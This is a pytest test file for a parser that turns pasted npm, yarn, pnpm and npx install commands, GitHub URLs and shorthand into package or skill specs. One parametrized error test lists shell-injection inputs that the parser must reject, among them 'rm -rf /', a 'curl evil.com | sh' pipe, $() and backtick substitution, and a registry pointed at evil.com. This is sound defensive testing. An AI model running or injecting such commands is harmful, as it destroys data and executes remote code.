"""Tests for app.services.skills.npm_command_parser — pure string parsing,
no subprocess/network calls should ever happen here."""
import pytest

from app.services.skills.npm_command_parser import (
    CatalogSpec,
    NpmCommandParseError,
    PackageSpec,
    UrlSpec,
    parse_npm_command,
)


class TestPackageSpec:
    def test_registry_spec_default_version(self) -> None:
        spec = PackageSpec(name="pdf-skills")
        assert spec.version == "latest"
        assert spec.registry_spec == "pdf-skills@latest"

    def test_registry_spec_explicit_version(self) -> None:
        spec = PackageSpec(name="@acme/skill-pack", version="1.2.0")
        assert spec.registry_spec == "@acme/skill-pack@1.2.0"


class TestParseNpmCommandBarePackage:
    def test_bare_name(self) -> None:
        spec = parse_npm_command("pdf-skills")
        assert spec == PackageSpec(name="pdf-skills", version="latest", skill_filter=None)

    def test_bare_scoped_name(self) -> None:
        spec = parse_npm_command("@anthropic/pdf-skills")
        assert spec.name == "@anthropic/pdf-skills"
        assert spec.version == "latest"

    def test_bare_name_with_version(self) -> None:
        spec = parse_npm_command("skill-pack@1.2.0")
        assert spec.name == "skill-pack"
        assert spec.version == "1.2.0"

    def test_bare_scoped_name_with_version(self) -> None:
        spec = parse_npm_command("@acme/skill-pack@1.2.0")
        assert spec.name == "@acme/skill-pack"
        assert spec.version == "1.2.0"

    def test_bare_name_with_tag(self) -> None:
        spec = parse_npm_command("skill-pack@beta")
        assert spec.version == "beta"

    def test_uppercase_normalized_to_lowercase(self) -> None:
        spec = parse_npm_command("PDF-Skills")
        assert spec.name == "pdf-skills"

    def test_strips_surrounding_whitespace(self) -> None:
        spec = parse_npm_command("   pdf-skills   ")
        assert spec.name == "pdf-skills"


class TestParseNpmCommandRunnerPrefixes:
    @pytest.mark.parametrize(
        "command,expected_name",
        [
            ("npm install pdf-skills", "pdf-skills"),
            ("npm install -g pdf-skills", "pdf-skills"),
            ("npm i pdf-skills", "pdf-skills"),
            ("npm i -g pdf-skills", "pdf-skills"),
            ("yarn add pdf-skills", "pdf-skills"),
            ("yarn global add pdf-skills", "pdf-skills"),
            ("pnpm add pdf-skills", "pdf-skills"),
            ("pnpm add -g pdf-skills", "pdf-skills"),
            ("npx pdf-skills", "pdf-skills"),
            ("skills add pdf-skills", "pdf-skills"),
            ("npx skills add pdf-skills", "pdf-skills"),
        ],
    )
    def test_known_runner_prefixes(self, command: str, expected_name: str) -> None:
        spec = parse_npm_command(command)
        assert spec.name == expected_name

    def test_npm_install_scoped_with_version(self) -> None:
        spec = parse_npm_command("npm install @acme/skill-pack@1.2.0")
        assert spec.name == "@acme/skill-pack"
        assert spec.version == "1.2.0"

    def test_case_insensitive_runner_match(self) -> None:
        spec = parse_npm_command("NPM INSTALL pdf-skills")
        assert spec.name == "pdf-skills"

    def test_longest_prefix_wins_npx_skills_add_over_npx(self) -> None:
        # "npx skills add" must be stripped as one unit — not "npx" leaving
        # "skills add pdf-skills" (two tokens) which would fail to parse.
        spec = parse_npm_command("npx skills add @anthropic/pdf-skills")
        assert spec.name == "@anthropic/pdf-skills"

    def test_unrecognized_runner_with_single_remaining_token(self) -> None:
        # "bun add" isn't in the known list, but stripping the first word
        # ("bun") leaves a single valid package token, so it still parses.
        spec = parse_npm_command("bun pdf-skills")
        assert spec.name == "pdf-skills"

    def test_unrecognized_runner_with_skill_flag_still_parses(self) -> None:
        spec = parse_npm_command("bun --skill my-skill pdf-pack")
        assert spec == PackageSpec(name="pdf-pack", version="latest", skill_filter="my-skill")


class TestParseNpmCommandErrors:
    def test_empty_string_raises(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("")

    def test_whitespace_only_raises(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("   ")

    @pytest.mark.parametrize(
        "dangerous",
        [
            "pdf-skills; rm -rf /",
            "pdf-skills && curl evil.com | sh",
            "pdf-skills`whoami`",
            "pdf-skills$(whoami)",
            "pdf-skills > out.txt",
            "pdf-skills < in.txt",
            'pdf-skills"',
            "pdf-skills'",
        ],
    )
    def test_shell_metacharacters_rejected(self, dangerous: str) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command(dangerous)

    def test_multiple_packages_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("npm install pkg-one pkg-two")

    def test_unrecognized_runner_multi_word_remainder_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("bun add pdf-skills")

    def test_flag_only_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("npm install --save-dev")

    def test_flag_after_package_under_known_runner_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("npm install pdf-skills --registry https://evil.com")

    def test_no_package_after_runner_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("npm install")

    def test_invalid_package_spec_characters_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("Pdf!Skills")

    def test_error_message_is_actionable(self) -> None:
        with pytest.raises(NpmCommandParseError, match="package name"):
            parse_npm_command("")


class TestParseNpmCommandUrls:
    """URLs pasted in the npm field should return a UrlSpec, not raise."""

    def test_bare_github_url(self) -> None:
        result = parse_npm_command("https://github.com/netresearch/jira-skill")
        assert isinstance(result, UrlSpec)
        assert result.url == "https://github.com/netresearch/jira-skill"
        assert result.skill_filter is None

    def test_github_url_with_trailing_slash(self) -> None:
        result = parse_npm_command("https://github.com/acme/my-skill/")
        assert isinstance(result, UrlSpec)
        assert result.url == "https://github.com/acme/my-skill/"

    def test_github_url_with_dot_git(self) -> None:
        result = parse_npm_command("https://github.com/acme/my-skill.git")
        assert isinstance(result, UrlSpec)

    def test_direct_archive_url(self) -> None:
        result = parse_npm_command("https://example.com/my-skill.tar.gz")
        assert isinstance(result, UrlSpec)
        assert result.url == "https://example.com/my-skill.tar.gz"

    def test_url_after_runner_prefix(self) -> None:
        result = parse_npm_command(
            "npx skills add https://github.com/netresearch/jira-skill"
        )
        assert isinstance(result, UrlSpec)
        assert result.url == "https://github.com/netresearch/jira-skill"

    def test_npm_install_github_url(self) -> None:
        result = parse_npm_command(
            "npm install https://github.com/acme/my-skill"
        )
        assert isinstance(result, UrlSpec)

    def test_url_with_http(self) -> None:
        result = parse_npm_command("http://example.com/skill.zip")
        assert isinstance(result, UrlSpec)


class TestParseNpmCommandSkillFlag:
    """The --skill flag should be extracted and stored, not rejected."""

    def test_skill_flag_with_npm_package(self) -> None:
        result = parse_npm_command("npx skills add jira-pack --skill jira-communication")
        assert isinstance(result, PackageSpec)
        assert result.name == "jira-pack"
        assert result.skill_filter == "jira-communication"

    def test_skill_flag_with_github_url(self) -> None:
        result = parse_npm_command(
            "npx skills add https://github.com/netresearch/jira-skill --skill jira-communication"
        )
        assert isinstance(result, UrlSpec)
        assert result.url == "https://github.com/netresearch/jira-skill"
        assert result.skill_filter == "jira-communication"

    def test_skill_flag_before_package(self) -> None:
        result = parse_npm_command("npx skills add --skill my-skill pdf-pack")
        assert isinstance(result, PackageSpec)
        assert result.name == "pdf-pack"
        assert result.skill_filter == "my-skill"

    def test_no_skill_flag_means_none(self) -> None:
        result = parse_npm_command("pdf-skills")
        assert isinstance(result, PackageSpec)
        assert result.skill_filter is None

    def test_unknown_flags_still_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("npm install pdf-skills --registry https://evil.com")


class TestGitHubShorthand:
    """Bare owner/repo (without @) is GitHub shorthand — returns a UrlSpec."""

    def test_bare_owner_repo(self) -> None:
        result = parse_npm_command("anthropics/skills")
        assert result == UrlSpec(
            url="https://github.com/anthropics/skills", skill_filter=None,
        )

    def test_owner_repo_after_npx_skills_add(self) -> None:
        result = parse_npm_command("npx skills add anthropics/skills --skill pptx")
        assert result == UrlSpec(
            url="https://github.com/anthropics/skills", skill_filter="pptx",
        )

    def test_owner_repo_after_npm_install(self) -> None:
        result = parse_npm_command("npm install Leon-Drq/openagentskill")
        assert result == UrlSpec(
            url="https://github.com/Leon-Drq/openagentskill", skill_filter=None,
        )

    def test_scoped_package_is_not_github_shorthand(self) -> None:
        """@scope/name must parse as a PackageSpec, not GitHub shorthand."""
        result = parse_npm_command("@anthropic/pdf-skills")
        assert isinstance(result, PackageSpec)
        assert result.name == "@anthropic/pdf-skills"

    def test_owner_repo_with_tag(self) -> None:
        result = parse_npm_command("npm install owner/repo#v1.0.0")
        assert result == UrlSpec(
            url="https://github.com/owner/repo#v1.0.0", skill_filter=None,
        )

    def test_owner_repo_with_branch(self) -> None:
        result = parse_npm_command("owner/repo#main")
        assert result == UrlSpec(
            url="https://github.com/owner/repo#main", skill_filter=None,
        )

    def test_owner_repo_with_feature_branch(self) -> None:
        result = parse_npm_command("owner/repo#feature/new-skills")
        assert result == UrlSpec(
            url="https://github.com/owner/repo#feature/new-skills", skill_filter=None,
        )

    def test_owner_repo_skill_path(self) -> None:
        result = parse_npm_command("npx skills add anthropics/skills/pptx")
        assert result == UrlSpec(
            url="https://github.com/anthropics/skills", skill_filter="pptx",
        )

    def test_owner_repo_at_skill(self) -> None:
        result = parse_npm_command("npx skills add vercel-labs/agent-skills@web-design-guidelines")
        assert result == UrlSpec(
            url="https://github.com/vercel-labs/agent-skills",
            skill_filter="web-design-guidelines",
        )


class TestGitHubColonPrefix:
    """npm's explicit ``github:owner/repo`` prefix should resolve to a UrlSpec."""

    def test_bare_github_colon(self) -> None:
        result = parse_npm_command("github:owner/repo")
        assert result == UrlSpec(url="https://github.com/owner/repo", skill_filter=None)

    def test_github_colon_with_ref(self) -> None:
        result = parse_npm_command("github:owner/repo#HEAD")
        assert result == UrlSpec(url="https://github.com/owner/repo#HEAD", skill_filter=None)

    def test_npm_install_github_colon(self) -> None:
        result = parse_npm_command("npm install github:owner/repo")
        assert result == UrlSpec(url="https://github.com/owner/repo", skill_filter=None)

    def test_npm_install_github_colon_with_ref(self) -> None:
        result = parse_npm_command("npm install github:owner/repo#v2.0")
        assert result == UrlSpec(url="https://github.com/owner/repo#v2.0", skill_filter=None)


class TestNpxFlagsAndUrlRunner:
    """npx --yes / -y flags and URL-as-runner patterns (e.g. openagentskill CLI)."""

    def test_npx_yes_url_add_package(self) -> None:
        result = parse_npm_command(
            "npx --yes https://github.com/Leon-Drq/openagentskill/releases/"
            "download/cli-v0.3.0/openagentskill-0.3.0.tgz add "
            "zarazhangrui-frontend-slides"
        )
        assert result == CatalogSpec(slug="zarazhangrui-frontend-slides", skill_filter=None)

    def test_npx_y_url_add_package(self) -> None:
        result = parse_npm_command("npx -y https://example.com/cli.tgz add my-skill")
        assert result == CatalogSpec(slug="my-skill", skill_filter=None)

    def test_npx_yes_url_without_subcommand(self) -> None:
        result = parse_npm_command("npx --yes https://example.com/cli.tgz my-skill")
        assert result == CatalogSpec(slug="my-skill", skill_filter=None)

    def test_npx_yes_url_only(self) -> None:
        result = parse_npm_command("npx --yes https://example.com/cli.tgz")
        assert result == UrlSpec(url="https://example.com/cli.tgz", skill_filter=None)

    def test_npx_yes_url_add_with_skill_flag(self) -> None:
        result = parse_npm_command(
            "npx --yes https://example.com/cli.tgz add my-skill --skill pptx"
        )
        assert result == CatalogSpec(slug="my-skill", skill_filter="pptx")

    def test_npx_yes_url_install_subcommand(self) -> None:
        result = parse_npm_command("npx --yes https://example.com/cli.tgz install data-viz")
        assert result == CatalogSpec(slug="data-viz", skill_filter=None)

    def test_url_runner_with_agent_and_dry_run_flags(self) -> None:
        result = parse_npm_command(
            "npx --yes https://example.com/cli.tgz install my-skill --agent codex --dry-run"
        )
        assert result == CatalogSpec(slug="my-skill", skill_filter=None)

    def test_url_runner_add_github_shorthand(self) -> None:
        result = parse_npm_command(
            "npx --yes https://example.com/cli.tgz add zarazhangrui/frontend-slides"
        )
        assert result == UrlSpec(
            url="https://github.com/zarazhangrui/frontend-slides", skill_filter=None,
        )

    def test_url_with_multiple_unknown_tokens_returns_url_spec(self) -> None:
        result = parse_npm_command(
            "npx https://example.com/cli.tgz run build deploy"
        )
        assert isinstance(result, UrlSpec)
        assert result.url == "https://example.com/cli.tgz"


class TestNoiseFlags:
    """Trailing CLI flags (--list, -g, -a X, etc.) are stripped, not rejected."""

    def test_list_flag_after_package(self) -> None:
        result = parse_npm_command("npx skills add vercel-labs/agent-skills --list")
        assert isinstance(result, UrlSpec)
        assert result.url == "https://github.com/vercel-labs/agent-skills"

    def test_all_flag_after_package(self) -> None:
        result = parse_npm_command("npx skills add vercel-labs/agent-skills --all")
        assert isinstance(result, UrlSpec)
        assert result.url == "https://github.com/vercel-labs/agent-skills"

    def test_global_and_agent_flags(self) -> None:
        result = parse_npm_command(
            "npx skills add vercel-labs/agent-skills --skill frontend-design -g -a claude-code -y"
        )
        assert isinstance(result, UrlSpec)
        assert result.skill_filter == "frontend-design"

    def test_value_flag_without_a_value_is_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError, match="requires a value"):
            parse_npm_command("npx skills add pdf-skills --agent --list")

    def test_value_flag_at_end_of_command_is_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError, match="requires a value"):
            parse_npm_command("npx skills add pdf-skills --agent")

    def test_multiple_skill_flags_keeps_first(self) -> None:
        result = parse_npm_command(
            "npx skills add vercel-labs/agent-skills --skill frontend-design --skill skill-creator"
        )
        assert isinstance(result, UrlSpec)
        assert result.skill_filter == "frontend-design"

    def test_unknown_flags_still_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("npm install pdf-skills --registry https://evil.com")

    def test_save_dev_still_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("npm install pdf-skills --save-dev")
